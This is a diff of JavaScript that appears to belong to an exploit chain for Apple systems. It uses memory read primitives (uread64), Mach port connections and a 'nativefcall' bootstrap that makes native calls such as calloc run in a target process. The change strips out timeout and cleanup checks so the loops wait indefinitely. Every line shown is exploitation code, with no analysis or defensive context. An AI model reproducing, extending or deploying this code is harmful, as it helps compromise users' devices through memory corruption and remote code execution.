@@ -6321,25 +6321,13 @@
       }
       let alive = false;
       if (success) {
-        let surface_wait_start = Date.now();
         while (true) {
           surface_address_remote = uread64(surface_address + 0x8n);
           if (surface_address_remote != 0n) {
             break;
           }
-          if (Date.now() - surface_wait_start > 5000) {
-            LOG("[x] Timed out waiting for surface_address_remote (5s)");
-            alive = false;
-            success = false;
-            break;
-          }
           usleep(1n);
         }
-        if (surface_address_remote == 0n) {
-          mach_port_deallocate(mach_task_self(), connection["client_port"]);
-          continue;
-        }
-        if (!success) break;
         LOG(`surface_address_remote: ${surface_address_remote.hex()}`);
         LOG("[i] starting nativefcall bootstrap");
         if (!setup_nativefcall_fcall()) {
@@ -6350,7 +6338,6 @@
           LOG("[i] nativefcall setup done...");
           lazy_fcall("usleep", 5n * 1000n);
           mpd_fcall_noreturn(CALLOC, 0x100n, 1n, 0n, 0n, 0n, 0n, 0n, 0n);
-          let fcall_wait_start = Date.now();
           while (true) {
             let interval = Date.now();
             let test_msg = test_msg_create(connection);
@@ -6359,11 +6346,6 @@
             LOG(`msg took: ${interval} ms`);
             if (kr == MACH_SEND_TIMED_OUT) {
               if (mpd_fcall_check_for_return() == false) {
-                if (Date.now() - fcall_wait_start > 5000) {
-                  LOG("[!] timeout waiting for mpd calloc() fcall return");
-                  alive = false;
-                  break;
-                }
                 continue;
               }
               LOG(`[i] calloc() survived !!!`);
